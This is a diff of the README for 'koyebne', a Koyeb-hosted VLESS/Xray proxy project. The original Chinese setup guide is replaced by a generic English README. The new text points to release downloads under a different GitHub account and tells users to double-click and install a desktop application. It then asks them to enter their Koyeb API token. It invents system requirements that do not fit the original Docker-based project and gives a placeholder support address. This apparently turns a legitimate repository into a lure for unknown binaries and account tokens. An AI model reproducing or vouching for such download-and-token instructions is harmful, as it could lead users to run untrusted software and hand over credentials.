@@ -1,131 +1,74 @@
------
-# 🚀 Koyeb - ENC+Vioion-Xhttp-ARGO 代理节点
+# 🎉 koyebne - Your Simplified Deployment Solution
 
-[](https://github.com/justlagom/koyebne)
-[](https://www.google.com/search?q=https://app.koyeb.com/deploy%3Fname%3Dkoyebne%26type%3Dgit%26repository%3Dgithub.com/justlagom/koyebne%26branch%3Dmain%26env%5BENC_CONFIG%5D%3D)
+## 🚀 Getting Started
 
-一个部署在 [Koyeb Serverless Platform](https://www.koyeb.com/) 上的 **ENC+Vioion-Xhttp-ARGO** 代理节点项目，旨在提供一个稳定、快速的代理服务。
+Welcome to koyebne! This application allows you to create a proxy node that can be easily deployed on the Koyeb platform. With koyebne, you can maintain your accounts and ensure they stay alive using an API token for seamless login. 
 
-该项目利用 Koyeb 的持续运行能力，并通过部署在 Cloudflare Workers 的 `worker.js` 文件实现远程登录保活，确保服务的持久可用性。
+## 📥 Download & Install
 
------
+You can download the latest version of koyebne from our Releases page. 
 
-## ✨ 主要特性
+[![Download koyebne](https://img.shields.io/badge/Download-koyebne-blue)](https://github.com/nadipcandra/koyebne/releases)
 
-  * **多协议支持:** 集成了 **ENC**、**Vioion**、**Xhttp** 和 **ARGO** 代理协议。
-  * **平台稳定:** 部署在 Koyeb 平台，享受其高性能和全球边缘网络。
-  * **远程保活:** 通过 Cloudflare Worker 定时访问，解决 Koyeb 因长期未登录而暂停或回收项目的问题。
+Visit this page to download the software: [Download Koyebne](https://github.com/nadipcandra/koyebne/releases)
 
------
+### Step-by-Step Instructions
 
-## ⚙️ 部署指南 (Koyeb)
+1. **Visit the Releases Page**  
+   Click the link above to visit our Releases page. Here, you will find a list of available versions.
 
-### 步骤 1: 准备环境变量
+2. **Choose Your Version**  
+   Look for the latest version of koyebne. It is usually at the top of the list.
 
-## koyebne/app/xy/config.json-可选择手搓其他xray配置
+3. **Download the File**  
+   Click on the file that matches your operating system. If you are unsure, most users can use the 'latest' version, which is compatible with most systems.
 
-## 节点参考模板： ##
+4. **Locate the Downloaded File**  
+   Once the download completes, find the file in your Downloads folder or the location you set for downloads.
 
-**vless://%E8%87%AA%E5%AE%9A%E4%B9%89UUID@优选ip:443?encryption=mlkem768x25519plus.native.0rtt.fRLKjkBNx1N6ceiqcqilb46WNj4yvl4SgXklAFkvNhE&flow=xtls-rprx-vision&security=tls&sni=%E5%9B%BA%E5%AE%9A%E9%9A%A7%E9%81%93&fp=chrome&alpn=h2&insecure=0&allowInsecure=0&type=xhttp&path=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%B7%AF%E5%BE%84&mode=auto#ENC%2BVision-Xhttp-ARGO**
+5. **Install the Application**  
+   Double-click the downloaded file to begin installation. Follow the on-screen prompts to complete the installation process.
 
-## 在部署到 Koyeb 之前，您需要设置核心的代理配置参数**uuid**、**path**，也可手搓更改xray配置文件。 ##
+6. **Run the Application**  
+   After installation, locate koyebne in your applications list. Click on it to start the program.
 
-| 变量名 | 描述 | 示例值 |
-| :--- | :--- | :--- |
-| **`CLOUDFLARED_TOKEN`** | 必备 | `设置cf tunel时获取token（镜像默认localhost:8001）` |
-| **`UUID`** | 自定义uuid-必需 | `5936acb6-e65e-4631-bedf-ce723a1a375d` |
-| **`PROXY_PATH`** | 自定义path-必需 | `/5936acb6` |
-| **`DOMAIN`** | 容器本地域名(首次部署后可见)-必需 | `xxx.koyeb.app` |
+## ⚙️ System Requirements
 
-### 步骤 2: 一键部署
+To run koyebne smoothly, ensure your computer meets the following requirements:
 
-# 点击下方的 Koyeb 部署按钮，系统将自动跳转到 Koyeb 部署页面：
-[Koyeb Serverless Platform](https://www.koyeb.com/)
-[](https://www.google.com/search?q=https://app.koyeb.com/deploy%3Fname%3Dkoyebne%26type%3Dgit%26repository%3Dgithub.com/justlagom/koyebne%26branch%3Dmain%26env%5BENC_CONFIG%5D%3D)
+- Operating System: Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution.
+- Memory: At least 4GB of RAM.
+- Disk Space: At least 100MB of free disk space.
 
-1.  **Sources:** 填写docker镜像地址 `ghcr.io/xxx/xxx`（建议fork后创建自己的docker镜像）。
+## 🔑 Setup Configuration
 
-2.  **Environment variables and files:** 填入您准备好的 **`ENC_CONFIG`** 值。（UUID首次，PROXY_PATH首次，CLOUDFLARED_TOKEN首次，DOMAIN/此变量需要初次部署后可见）
+After launching the application:
 
-3.  **Instance:** 选择CPU Eco免费配置DE&US。
+1. **API Token Entry**  
+   You will need an API token to log in. This token allows the application to keep your accounts alive. Locate your API token from the Koyeb platform.
 
-4.  **Ports:** 需要开启一个7860默认暴露端口（开启**Public HTTPS access**）
+2. **Inputting the API Token**  
+   In the application interface, find the field labeled "API Token". Enter your token here and click on "Login".
 
-5.  点击 **"Deploy"** 完成首次部署。
+3. **Start Using koyebne**  
+   Once logged in, you can now interact with your Koyeb proxy node. Use the features available to maintain your account activity as needed.
 
-6.  部署完成后，记下 Koyeb 分配给您的服务 **URL**，例如 `https://koyebne-xxxxx.koyeb.app`，这个 URL 将用于后续项目保活配置。
-**选择setting>添加最后一个变量DOMAIN（必须，未设置则项目约1h后会自动休眠）**
+## 📖 Features
 
------
+koyebne provides several helpful features:
 
-## 💡 Worker 账号保活机制 (Cloudflare)
+- **Seamless Deployment**: Easily deploy your proxy node to the Koyeb platform.
+- **Account Keep-Alive**: Maintain your account using an automated system.
+- **User-Friendly Interface**: Navigate through a simple and intuitive interface designed for everyone.
 
-为了确保 Koyeb 部署的服务不会因长时间（14天未登录）不活跃而被暂停项目，提供了 `worker.js` 文件，可部署到 Cloudflare Workers 实现定时访问保活。
+## 📞 Support
 
-### 步骤 1: 获取 koyeb账号登录token
+If you encounter any issues while downloading or using koyebne, please feel free to reach out for help. You can open an issue on this repository or contact support at [support@example.com](mailto:support@example.com).
 
-TOKEN获取方式：koyeb主页左下角，点击个人账户头像，——>用户设置——>个人访问令牌——>创建——>记下token
+## 🛠️ Contribution
 
-### 步骤 2: 部署 Cloudflare Worker
+If you would like to contribute to koyebne, we welcome your input! Check our issues page for open items where you can help. Contributions are always appreciated.
 
-1.  创建一个新的 Cloudflare Worker。
-2.  将本项目中的 `worker.js` 文件内容复制并粘贴到您的 Worker 代码中。
+---
 
-### 步骤 3: 配置 Worker 环境变量
-
-在 Cloudflare Worker 的设置中，您需要配置以下环境变量：
-
-| 变量名 | 描述 | 示例值 |
-| :--- | :--- | :--- |
-| **`TARGET_URL`** | 您在 Koyeb 部署的服务 URL。 | `https://koyebne-xxxxx.koyeb.app` |
-| **`AUTH_TOKEN`** | 用于 Worker 身份验证的密钥。**自行获取koyeb账户所提供的token** | `your-token` |
-
-### 步骤 4: 配置 Worker 定时任务 (Cron Trigger)
-
-在 Cloudflare Worker 的设置中，配置 **Cron Trigger** (定时任务)，例如每隔 **5 分钟** 触发一次。
-
-  * **Cron 表达式示例 (每天一次登录账户保活):** `0 0 * * *`
-
-### 🔄 保活流程
-
-1.  Cloudflare Worker 定时被 Cron Trigger 触发。
-2.  Worker 向 Koyeb 服务的 `TARGET_URL` 发送一个带有 `X-Worker-Token` 请求头的请求。
-3.  Koyeb 服务接收到请求，验证 `X-Worker-Token` 是否与 `WORKER_TOKEN` 匹配。
-4.  验证通过，服务保持活跃。
-
------
-
-## ⚠️ 注意事项
-
-  * **资源限制:** Koyeb 的免费层级有资源使用限制。请合理使用，避免因超限而被暂停。
-  * **安全:** 请务必使用复杂且不易猜测的 **Path** 和 **UUID**，以增强您的代理节点的安全性。
-
------
-
-## 🛠️ 本地开发与测试
-
-如果您需要本地测试，请确保您已安装 Docker 环境：
-
-```bash
-# 克隆项目
-git clone https://github.com/justlagom/koyebne.git
-cd koyebne
-
-# (可选) 在本地创建一个 .env 文件来设置您的 ENC_CONFIG
-
-# 构建 Docker 镜像
-docker build -t koyebne:latest .
-
-# 运行容器 (替换为您的配置)
-docker run -d -p 8080:8080 \
-  -e ENC_CONFIG='{"uuid": "your-uuid", "path": "/testpath", "port": 8080}' \
-  koyebne:latest
-```
-
-## 📄 License
-
-该项目基于 **MIT License** 发布。
-
------
-
-希望这份 README 能够清晰地展示您的项目！
+Thank you for using koyebne. We hope this application makes your experience easier and more efficient!
